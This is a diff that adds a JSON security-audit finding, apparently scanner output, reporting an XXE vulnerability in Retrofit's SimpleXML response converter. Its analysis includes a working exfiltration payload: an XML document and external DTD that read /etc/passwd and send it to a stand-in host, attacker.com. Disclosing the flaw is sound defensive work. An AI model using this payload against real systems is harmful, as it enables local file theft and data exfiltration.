@@ -1,0 +1,17 @@
+[
+  {
+    "finding_id": "88f48076-c7d7-5cce-990d-0121eb190bf4",
+    "session_id": "ChBkOGM3NmQyNDA3Y2M4ZjdmEAgaATAqBG1haW4",
+    "title": "XML External Entity (XXE) Injection in SimpleXML Converter Factory",
+    "file_path": "/home/jfplante_google_com/repos/p22-retrofit_rep1/retrofit-converters/simplexml/src/main/java/retrofit2/converter/simplexml/SimpleXmlResponseBodyConverter.java",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "The `SimpleXmlConverterFactory` utilizes `org.simpleframework.xml.core.Persister` as its default serializer (or can be configured with one). By default, SimpleXML's `Persister` handles XML deserialization without disabling DTDs or external entity resolution. \n\nWhen a Retrofit client uses `SimpleXmlConverterFactory` to communicate with a remote server, a compromised or malicious server can return a crafted XML response that includes external entity definitions or entity expansions. When `SimpleXmlResponseBodyConverter.convert` processes this untrusted response body via `serializer.read(cls, value.charStream(), strict)`, the parser resolves these external entities.\n\nAn attacker can exploit this XML External Entity (XXE) vulnerability to perform local file disclosure, launch SSRF attacks against internal network resources, or cause a denial of service (DoS) using XML entity expansion (the Billion Laughs attack).\n\n### Conceptual Exploit Payload (File Disclosure via XXE)\nAn attacker-controlled server can return the following malicious XML payload in response to a Retrofit request:\n\n```xml\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003c!DOCTYPE root [  \n  \u003c!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"\u003e\n  %dtd;\n  %exfiltrate;\n]\u003e\n\u003cmy-object\u003e\n  \u003cmessage\u003e\u0026exfil;\u003c/message\u003e\n  \u003ccount\u003e10\u003c/count\u003e\n\u003c/my-object\u003e\n```\n\nWhere the external DTD hosted at `http://attacker.com/evil.dtd` contains:\n```xml\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e\n\u003c!ENTITY % exfiltrate \"\u003c!ENTITY \u0026#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'\u003e\"\u003e\n```\n\nWhen parsed by the vulnerable `SimpleXmlResponseBodyConverter`, the client parses `/etc/passwd` and exfiltrates its content to `attacker.com`.",
+    "snippet": "  @Override\n  public T convert(ResponseBody value) throws IOException {\n    try {\n      T read = serializer.read(cls, value.charStream(), strict);",
+    "vuln_type": "XML External Entity (XXE) Injection",
+    "vuln_id": "CWE-611",
+    "status": "OPEN",
+    "start_line": 35,
+    "end_line": 41
+  }
+]
